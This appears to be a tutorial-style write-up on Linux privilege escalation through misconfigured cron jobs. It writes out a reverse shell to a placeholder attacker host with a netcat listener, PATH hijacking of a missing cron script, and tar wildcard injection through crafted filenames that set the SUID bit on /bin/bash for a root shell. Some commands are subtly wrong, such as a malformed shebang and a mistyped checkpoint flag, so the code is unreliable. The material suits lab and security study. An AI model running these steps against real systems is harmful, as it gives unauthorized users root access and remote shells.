Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under ```/etc/crontab```

![Screenshot from 2024-09-29 01-35-10](https://github.com/user-attachments/assets/3c66a139-7a4a-4044-a61d-e190d4f5fb7c)



You can see the ```backup.sh``` script was configured to run every minute with root access.

As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges. So we should edit this file to make a reverse sell.
```
#! /bin/bash

bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```
After this we should setup a listener to recieve or connection:
```
nc -nlvp <ATTACKER_PORT>
```

![Screenshot from 2024-09-29 01-46-01](https://github.com/user-attachments/assets/8d8dc417-5c7e-4eb9-920f-98cf50ece95d)

The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the ```PATH```variable in the ```/etc/cronta```b file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.

Finallly, we could creat ```antivirus.sh``` file and insert into the reverse shell code and setup a listener to recieve or connection.

Another one
----

If the crontab run a file with root access and this file contain `tar` command with ```*``` , this an indicator of privilege escalation.

****Vulnerable bash script****
```
#!/bin/bash
cd /home/ubuntu/Desktop/TarWildCardPrivEsc/
tar -zcf /home/ubuntu/Desktop/TarWildCardPrivEsc/backup.tgz *
```
* The wildcard `*` matches all files and directories in the current directory. This means all files in /home/ubuntu/Desktop/TarWildCardPrivEsc/ will be included in the backup.tgz archive.

>As an attacker, we can leverage this and create specially crafted filenames that will be interpreted as **flags** for tar, instead of actual files.

The critical two flags we will use:
```
--checkpoint=1    >>>>>>> means "execute a checkpoint every 1 file processed.
--checkpoint-action=    >>>>>> do an action every checkpoint
```
The above two commands use the exec parameter of checkpoint-action to execute commands through the tar command. This is how we’ll abuse this:

```
echo '#/!bin/bash\nchmod +s /bin/bash' > shell.sh
                     
                          #or
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/shell.sh    
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
In the backend, the whole thing is interpreted as:
```
tar -zcf /home/ubuntu/Desktop/TarWildCardPrivEsc/backup.tgz --checkpoint=1 --checkpoint=action=exec=sh shell.sh
```
The ```shell.sh``` contains a bash shell with a command that sets SUID bit to ```/bin/bash```. The second command executes the ```shell.sh```. So when the cronjob will execute the next minute, it will take those files as arguments/flags rather than a normal file name and set ```/bin/bash``` with setuid permission.

![Screenshot from 2024-09-29 04-31-59](https://github.com/user-attachments/assets/94a82170-755b-4416-9bd8-48d7f938827a)

We can see that /bin/bash now has a SUID bit set means we can execute it with root privileges and get the root shell.

Now run the below command to get the root shell.

```
/bin/bash -p
```

